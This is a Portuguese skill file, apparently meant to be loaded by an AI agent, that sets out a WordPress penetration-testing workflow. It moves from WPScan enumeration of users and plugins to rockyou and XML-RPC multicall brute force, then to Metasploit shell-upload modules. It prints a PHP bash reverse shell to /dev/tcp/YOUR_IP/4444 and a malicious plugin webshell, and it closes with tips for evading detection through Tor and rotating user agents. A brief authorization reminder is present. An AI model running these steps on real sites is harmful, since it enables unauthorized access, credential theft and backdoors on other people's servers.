---
name: Teste de Penetração WordPress
description: Esta skill deve ser usada quando o usuário pedir para "fazer pentest em sites WordPress", "escanear WordPress por vulnerabilidades", "enumerar usuários, temas ou plugins do WordPress", "explorar vulnerabilidades do WordPress", ou "usar WPScan". Fornece metodologias abrangentes de avaliação de segurança WordPress.
metadata:
  author: zebbern
  version: "1.1"
---

# Teste de Penetração WordPress

## Propósito

Realizar avaliações de segurança abrangentes de instalações WordPress incluindo enumeração de usuários, temas e plugins, varredura de vulnerabilidades, ataques de credenciais e técnicas de exploração. WordPress alimenta aproximadamente 35% dos sites, tornando-o um alvo crítico para testes de segurança.

## Pré-requisitos

### Ferramentas Obrigatórias
- WPScan (pré-instalado no Kali Linux)
- Metasploit Framework
- Burp Suite ou OWASP ZAP
- Nmap para descoberta inicial
- cURL ou wget

### Conhecimento Obrigatório
- Arquitetura e estrutura do WordPress
- Fundamentos de testes de aplicações web
- Compreensão do protocolo HTTP
- Vulnerabilidades web comuns (OWASP Top 10)

## Outputs e Entregáveis

1. **Relatório de Enumeração WordPress** - Versão, temas, plugins, usuários
2. **Avaliação de Vulnerabilidades** - CVEs identificadas e configurações incorretas
3. **Avaliação de Credenciais** - Descobertas de senhas fracas
4. **Prova de Exploração** - Documentação de acesso a shell

## Fluxo de Trabalho Principal

### Fase 1: Descoberta WordPress

Identificar instalações WordPress:

```bash
# Verificar indicadores de WordPress
curl -s http://target.com | grep -i wordpress
curl -s http://target.com | grep -i "wp-content"
curl -s http://target.com | grep -i "wp-includes"

# Verificar caminhos comuns do WordPress
curl -I http://target.com/wp-login.php
curl -I http://target.com/wp-admin/
curl -I http://target.com/wp-content/
curl -I http://target.com/xmlrpc.php

# Verificar tag meta generator
curl -s http://target.com | grep "generator"

# Detecção Nmap WordPress
nmap -p 80,443 --script http-wordpress-enum target.com
```

Arquivos e diretórios-chave do WordPress:
- `/wp-admin/` - Painel de administração
- `/wp-login.php` - Página de login
- `/wp-content/` - Temas, plugins, uploads
- `/wp-includes/` - Arquivos principais
- `/xmlrpc.php` - Interface XML-RPC
- `/wp-config.php` - Configuração (não acessível se seguro)
- `/readme.html` - Informações de versão

### Fase 2: Enumeração Básica com WPScan

Varredura abrangente do WordPress com WPScan:

```bash
# Scan básico
wpscan --url http://target.com/wordpress/

# Com API token (para dados de vulnerabilidade)
wpscan --url http://target.com --api-token YOUR_API_TOKEN

# Modo de detecção agressivo
wpscan --url http://target.com --detection-mode aggressive

# Saída para arquivo
wpscan --url http://target.com -o results.txt

# Saída JSON
wpscan --url http://target.com -f json -o results.json

# Saída detalhada
wpscan --url http://target.com -v
```

### Fase 3: Detecção de Versão WordPress

Identificar versão do WordPress:

```bash
# Detecção de versão WPScan
wpscan --url http://target.com

# Verificações manuais de versão
curl -s http://target.com/readme.html | grep -i version
curl -s http://target.com/feed/ | grep -i generator
curl -s http://target.com | grep "?ver="

# Verificar meta generator
curl -s http://target.com | grep 'name="generator"'

# Verificar feeds RSS
curl -s http://target.com/feed/
curl -s http://target.com/comments/feed/
```

Fontes de versão:
- Tag meta generator no HTML
- Arquivo readme.html
- Feeds RSS/Atom
- Versões de arquivo JavaScript/CSS

### Fase 4: Enumeração de Temas

Identificar temas instalados:

```bash
# Enumerar todos os temas
wpscan --url http://target.com -e at

# Enumerar apenas temas vulneráveis
wpscan --url http://target.com -e vt

# Enumeração de temas com modo de detecção
wpscan --url http://target.com -e at --plugins-detection aggressive

# Detecção manual de temas
curl -s http://target.com | grep "wp-content/themes/"
curl -s http://target.com/wp-content/themes/
```

Verificações de vulnerabilidade de temas:
```bash
# Pesquisar exploits de tema
searchsploit wordpress theme <nome_tema>

# Verificar versão do tema
curl -s http://target.com/wp-content/themes/<tema>/style.css | grep -i version
curl -s http://target.com/wp-content/themes/<tema>/readme.txt
```

### Fase 5: Enumeração de Plugins

Identificar plugins instalados:

```bash
# Enumerar todos os plugins
wpscan --url http://target.com -e ap

# Enumerar apenas plugins vulneráveis
wpscan --url http://target.com -e vp

# Detecção agressiva de plugins
wpscan --url http://target.com -e ap --plugins-detection aggressive

# Modo de detecção misto
wpscan --url http://target.com -e ap --plugins-detection mixed

# Descoberta manual de plugins
curl -s http://target.com | grep "wp-content/plugins/"
curl -s http://target.com/wp-content/plugins/
```

Plugins vulneráveis comuns a verificar:
```bash
# Pesquisar exploits de plugin
searchsploit wordpress plugin <nome_plugin>
searchsploit wordpress mail-masta
searchsploit wordpress slideshow gallery
searchsploit wordpress reflex gallery

# Verificar versão do plugin
curl -s http://target.com/wp-content/plugins/<plugin>/readme.txt
```

### Fase 6: Enumeração de Usuários

Descobrir usuários do WordPress:

```bash
# Enumeração de usuários WPScan
wpscan --url http://target.com -e u

# Enumerar número específico de usuários
wpscan --url http://target.com -e u1-100

# Enumeração de ID de autor (manual)
for i in {1..20}; do
    curl -s "http://target.com/?author=$i" | grep -o 'author/[^/]*/'
done

# Enumeração de API JSON (se ativada)
curl -s http://target.com/wp-json/wp/v2/users

# Enumeração REST API
curl -s http://target.com/wp-json/wp/v2/users?per_page=100

# Enumeração de erro de login
curl -X POST -d "log=admin&pwd=wrongpass" http://target.com/wp-login.php
```

### Fase 7: Enumeração Abrangente

Executar todos os módulos de enumeração:

```bash
# Enumerar tudo
wpscan --url http://target.com -e at -e ap -e u

# Scan abrangente alternativo
wpscan --url http://target.com -e vp,vt,u,cb,dbe

# Flags de enumeração:
# at - Todos os temas
# vt - Temas vulneráveis
# ap - Todos os plugins
# vp - Plugins vulneráveis
# u  - Usuários (1-10)
# cb - Backups de configuração
# dbe - Exportações de banco de dados

# Enumeração agressiva completa
wpscan --url http://target.com -e at,ap,u,cb,dbe \
    --detection-mode aggressive \
    --plugins-detection aggressive
```

### Fase 8: Ataques de Senha

Força bruta de credenciais WordPress:

```bash
# Força bruta de usuário único
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# Múltiplos usuários de arquivo
wpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt

# Com threads de ataque de senha
wpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50

# Força bruta XML-RPC (mais rápido, pode contornar proteção)
wpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc

# Força bruta com limitação de API
wpscan --url http://target.com -U admin -P passwords.txt --throttle 500

# Criar wordlist direcionada
cewl http://target.com -w wordlist.txt
wpscan --url http://target.com -U admin -P wordlist.txt
```

Métodos de ataque de senha:
- `wp-login` - Formulário de login padrão
- `xmlrpc` - Multicall XML-RPC (mais rápido)
- `xmlrpc-multicall` - Múltiplas senhas por requisição

### Fase 9: Exploração de Vulnerabilidade

#### Metasploit Upload de Shell

Após obter credenciais:

```bash
# Iniciar Metasploit
msfconsole

# Upload de shell de admin
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD jessica
set TARGETURI /wordpress
set LHOST <seu_ip>
exploit
```

#### Exploração de Plugin

```bash
# Exploit Slideshow Gallery
use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOSTS target.com
set TARGETURI /wordpress
set USERNAME admin
set PASSWORD jessica
set LHOST <seu_ip>
exploit

# Pesquisar exploits WordPress
search type:exploit platform:php wordpress
```

#### Exploração Manual

Editor de tema/plugin (com acesso de admin):

```php
// Navegue para Aparência > Editor de Tema
// Edite 404.php ou functions.php
// Adicione reverse shell PHP:

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
?>

// Ou use backdoor weevely
// Acesse via: http://target.com/wp-content/themes/nome_tema/404.php
```

Método de upload de plugin:

```bash
# Criar plugin malicioso
cat > malicious.php << 'EOF'
<?php
/*
Plugin Name: Malicious Plugin
Description: Security Testing
Version: 1.0
*/
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOF

# Compactar e fazer upload via Plugins > Adicionar Novo > Upload de Plugin
zip malicious.zip malicious.php

# Acessar webshell
curl "http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id"
```

### Fase 10: Técnicas Avançadas

#### Exploração XML-RPC

```bash
# Verificar se XML-RPC está ativado
curl -X POST http://target.com/xmlrpc.php

# Listar métodos disponíveis
curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php

# Força bruta via multicall XML-RPC
cat > xmlrpc_brute.xml << 'EOF'
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>password2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>
EOF

curl -X POST -d @xmlrpc_brute.xml http://target.com/xmlrpc.php
```

#### Varredura Através de Proxy

```bash
# Usar proxy Tor
wpscan --url http://target.com --proxy socks5://127.0.0.1:9050

# Proxy HTTP
wpscan --url http://target.com --proxy http://127.0.0.1:8080

# Proxy Burp Suite
wpscan --url http://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks
```

#### Autenticação HTTP

```bash
# Autenticação básica
wpscan --url http://target.com --http-auth admin:password

# Forçar SSL/TLS
wpscan --url https://target.com --disable-tls-checks
```

## Referência Rápida

### Flags de Enumeração WPScan

| Flag | Descrição |
|------|-----------|
| `-e at` | Todos os temas |
| `-e vt` | Temas vulneráveis |
| `-e ap` | Todos os plugins |
| `-e vp` | Plugins vulneráveis |
| `-e u` | Usuários (1-10) |
| `-e cb` | Backups de configuração |
| `-e dbe` | Exportações de banco de dados |

### Caminhos Comuns do WordPress

| Caminho | Propósito |
|--------|----------|
| `/wp-admin/` | Painel de administração |
| `/wp-login.php` | Página de login |
| `/wp-content/uploads/` | Uploads de usuários |
| `/wp-includes/` | Arquivos principais |
| `/xmlrpc.php` | API XML-RPC |
| `/wp-json/` | API REST |

### Exemplos de Comando WPScan

| Propósito | Comando |
|-----------|---------|
| Scan básico | `wpscan --url http://target.com` |
| Todas as enumerações | `wpscan --url http://target.com -e at,ap,u` |
| Ataque de senha | `wpscan --url http://target.com -U admin -P pass.txt` |
| Agressivo | `wpscan --url http://target.com --detection-mode aggressive` |

## Restrições e Limitações

### Considerações Legais
- Obter autorização escrita antes de testar
- Permanecer dentro do escopo definido
- Documentar todas as atividades de teste
- Seguir divulgação responsável

### Limitações Técnicas
- WAF pode bloquear varreduras
- Limitação de taxa pode impedir força bruta
- Alguns plugins podem ter falsos negativos
- XML-RPC pode estar desativado

### Evasão de Detecção
- Usar user agents aleatórios: `--random-user-agent`
- Limitar requisições: `--throttle 1000`
- Usar rotação de proxy
- Evitar modos agressivos em sites monitorados

## Solução de Problemas

### WPScan Não Mostra Vulnerabilidades

**Soluções:**
1. Usar API token para banco de dados de vulnerabilidades
2. Tentar modo de detecção agressivo
3. Verificar se WAF está bloqueando varreduras
4. Verificar se WordPress está realmente instalado

### Força Bruta Bloqueada

**Soluções:**
1. Usar método XML-RPC em vez de wp-login
2. Adicionar throttling: `--throttle 500`
3. Usar user agents diferentes
4. Verificar bloqueio de IP/fail2ban

### Não Consegue Acessar Painel de Admin

**Soluções:**
1. Verificar se as credenciais estão corretas
2. Verificar autenticação de dois fatores
3. Procurar restrições de lista branca de IP
4. Verificar mudanças de URL de login (plugins de segurança)